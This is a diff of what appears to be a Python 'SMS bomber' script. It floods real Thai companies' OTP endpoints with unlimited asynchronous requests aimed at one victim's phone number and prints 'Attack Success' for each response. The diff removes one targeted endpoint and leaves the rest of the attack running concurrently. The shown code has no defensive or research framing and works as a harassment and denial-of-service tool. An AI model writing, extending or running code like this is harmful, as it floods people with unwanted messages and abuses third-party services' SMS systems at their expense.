@@ -22,17 +22,7 @@ async def api1():
                 else:
                     print("API 1 Attack Fail Status API : ", response.status)
 
-async def api2():
-    url = f"https://portal-api.mcloud.co.th/api/v1/otp?phoneNumber={phone}"
-    async with aiohttp.ClientSession() as session:
-        while True:
-            async with session.get(url) as response:
-                if response.status == 200:
-                    print("API 2 Attack Success Status API : ", response.status)
-                else:
-                    print("API 2 Attack Fail Status API : ", response.status)
-                    
-                    
+
 async def api3():
     url = "https://www.easymoney.co.th/estimate/actionSendOtp"
     headers1 = {'content-type': 'application/x-www-form-urlencoded'}
@@ -70,7 +60,7 @@ async def api5():
 
 
 async def main():
-    await asyncio.gather(api1(), api2(), api3(), api4(), api5())
+    await asyncio.gather(api1(), api3(), api4(), api5())
 
 if __name__ == "__main__":
     asyncio.run(main())
